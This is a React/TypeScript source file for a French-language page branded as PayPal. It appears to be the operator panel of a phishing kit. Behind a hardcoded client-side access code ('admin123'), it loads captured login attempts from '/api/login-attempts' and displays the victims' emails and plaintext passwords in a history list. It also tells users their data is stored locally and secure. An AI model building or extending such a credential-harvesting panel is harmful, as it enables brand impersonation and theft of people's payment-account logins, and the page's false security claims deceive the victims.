import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useLocation } from "wouter";
import { ArrowLeft, Eye, EyeOff, Trash2, Lock } from "lucide-react";

const decryptData = (data: string) => atob(data);
const ADMIN_CODE = "admin123";

interface HistoryItem {
  id: string;
  email: string;
  password: string;
  success: number;
  createdAt: string;
}

export default function SettingsPage() {
  const [, setLocation] = useLocation();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [hasCredentials, setHasCredentials] = useState(false);
  const [history, setHistory] = useState<HistoryItem[]>([]);
  const [adminPassword, setAdminPassword] = useState("");
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [adminError, setAdminError] = useState("");

  useEffect(() => {
    const authorized = localStorage.getItem("settingsAuthorized");
    if (authorized === "true") {
      setIsAuthorized(true);
      loadData();
    }
  }, []);

  const loadData = async () => {
    try {
      const res = await fetch("/api/login-attempts");
      if (res.ok) {
        const data = await res.json();
        setHistory(data.attempts || []);
        if (data.attempts && data.attempts.length > 0) {
          const lastAttempt = data.attempts[0];
          setEmail(lastAttempt.email);
          setPassword(lastAttempt.password);
          setHasCredentials(true);
        }
      }
    } catch (e) {
      setHistory([]);
    }
  };

  const handleAdminLogin = () => {
    if (adminPassword === ADMIN_CODE) {
      setIsAuthorized(true);
      localStorage.setItem("settingsAuthorized", "true");
      setAdminError("");
      loadData();
    } else {
      setAdminError("Code incorrect");
    }
  };

  const handleForget = () => {
    setEmail("");
    setPassword("");
    setShowPassword(false);
    setHasCredentials(false);
    setHistory([]);
    alert("Toutes les données ont été supprimées !");
    setLocation("/");
  };

  if (!isAuthorized) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white">
        <div className="bg-blue-700 py-6 px-4 text-center shadow-sm">
          <h1 className="text-3xl font-bold text-white">
            <span className="text-black">Pay</span><span className="text-blue-400">Pal</span>
          </h1>
        </div>

        <div className="flex items-center justify-center min-h-[calc(100vh-80px)] p-4">
          <div className="w-full max-w-md">
            <div className="text-center mb-12">
              <div className="bg-blue-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6">
                <Lock className="w-10 h-10 text-blue-700" />
              </div>
              <h2 className="text-3xl font-bold text-slate-900 mb-2">Accès sécurisé</h2>
              <p className="text-slate-600">Entrez le code pour accéder aux paramètres</p>
            </div>

            <div className="bg-white rounded-lg shadow-md p-8 border border-slate-200">
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-semibold text-slate-900 mb-3">
                    Code d'accès
                  </label>
                  <Input
                    type="password"
                    placeholder="••••••"
                    value={adminPassword}
                    onChange={(e) => {
                      setAdminPassword(e.target.value);
                      setAdminError("");
                    }}
                    onKeyPress={(e) => e.key === "Enter" && handleAdminLogin()}
                    className="w-full px-4 py-3 border border-slate-300 rounded-lg text-base font-semibold tracking-widest text-center focus:border-blue-700 focus:outline-none"
                    data-testid="input-admin-code"
                  />
                  {adminError && (
                    <p className="text-red-600 text-sm mt-2 font-medium">❌ {adminError}</p>
                  )}
                </div>

                <Button
                  onClick={handleAdminLogin}
                  className="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-3 rounded-lg text-base transition duration-200 shadow-sm"
                  data-testid="button-admin-login"
                >
                  Accéder aux paramètres
                </Button>
              </div>

              <button
                onClick={() => setLocation("/")}
                className="w-full mt-6 text-sm text-blue-700 hover:text-blue-800 font-semibold transition"
              >
                ← Retour à la connexion
              </button>
            </div>

            <p className="text-center text-xs text-slate-500 mt-8">
              Vos données sont protégées et sécurisées
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white">
      <div className="bg-blue-700 py-6 px-4 text-center shadow-sm">
        <h1 className="text-3xl font-bold text-white">
          <span className="text-black">Pay</span><span className="text-blue-400">Pal</span>
        </h1>
      </div>

      <div className="flex items-center justify-center min-h-[calc(100vh-80px)] p-4">
        <div className="w-full max-w-lg">
          <div className="mb-10">
            <button
              onClick={() => setLocation("/")}
              className="text-blue-700 hover:text-blue-800 text-sm font-bold flex items-center gap-1 mb-6 transition"
              data-testid="button-back"
            >
              <ArrowLeft className="w-4 h-4" /> Retour
            </button>
            <h2 className="text-4xl font-bold text-slate-900 mb-2">Paramètres</h2>
            <p className="text-slate-600">Gérez vos données sauvegardées de manière sécurisée</p>
          </div>

          {hasCredentials || history.length > 0 ? (
            <div className="space-y-10">
              {email && (
                <div className="bg-white rounded-lg border border-slate-200 p-16 shadow-sm">
                  <label className="block text-2xl font-bold text-slate-500 uppercase tracking-wide mb-8">Adresse email</label>
                  <p className="text-4xl text-slate-900 break-all font-medium">{email}</p>
                </div>
              )}

              {password && (
                <div className="bg-white rounded-lg border border-slate-200 p-16 shadow-sm">
                  <label className="block text-2xl font-bold text-slate-500 uppercase tracking-wide mb-8">Mot de passe</label>
                  <div className="flex gap-6">
                    <div className="flex-1">
                      <p className="text-4xl text-slate-900 font-mono font-bold">{showPassword ? password : "••••••••"}</p>
                    </div>
                    <button
                      onClick={() => setShowPassword(!showPassword)}
                      className="px-8 py-6 border border-slate-300 rounded-lg hover:bg-slate-50 transition bg-white"
                      data-testid="button-toggle-password"
                      title={showPassword ? "Masquer" : "Afficher"}
                    >
                      {showPassword ? (
                        <EyeOff className="w-10 h-10 text-slate-700" />
                      ) : (
                        <Eye className="w-10 h-10 text-slate-700" />
                      )}
                    </button>
                  </div>
                </div>
              )}

              {history.length > 0 && (
                <div className="bg-white rounded-lg border border-slate-200 p-16 shadow-sm">
                  <label className="block text-2xl font-bold text-slate-500 uppercase tracking-wide mb-8">Historique de connexion</label>
                  <div className="max-h-screen overflow-y-auto space-y-8">
                    {history.map((item, index) => (
                      <div key={index} className="text-2xl text-slate-700 pb-8 border-b border-slate-100 last:border-b-0">
                        <p className="text-xl font-bold text-slate-500 mb-4">📧 {item.email} • {new Date(item.createdAt).toLocaleString('fr-FR')}</p>
                        <p className="font-mono text-slate-800 break-all text-xl">🔐 {item.password}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              <div className="bg-blue-50 border border-blue-200 rounded-lg p-16">
                <p className="font-bold text-blue-900 mb-4 text-3xl">🔒 Sécurité</p>
                <p className="text-2xl text-blue-800">Vos données sont stockées localement sur cet appareil.</p>
              </div>

              <Button
                onClick={handleForget}
                className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-6 rounded-lg flex items-center justify-center gap-2 text-2xl transition shadow-sm"
                data-testid="button-forget-device"
              >
                <Trash2 className="w-5 h-5" /> Oublier cet appareil
              </Button>
            </div>
          ) : (
            <div className="text-center py-16 bg-white rounded-lg border border-slate-200 shadow-sm">
              <p className="text-slate-600 text-lg mb-6">📭 Aucune donnée sauvegardée</p>
              <Button
                onClick={() => setLocation("/")}
                className="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-3 rounded-lg text-base transition"
                data-testid="button-go-to-login"
              >
                Aller à la connexion
              </Button>
            </div>
          )}
        </div>
      </div>

      <div className="border-t border-slate-200 bg-white py-6 px-4 text-center text-xs text-slate-600 mt-8">
        <div className="flex gap-4 justify-center">
          <a href="#" className="hover:text-slate-900 transition">Conditions d'utilisation</a>
          <span>|</span>
          <a href="#" className="hover:text-slate-900 transition">Confidentialité</a>
        </div>
      </div>
    </div>
  );
}
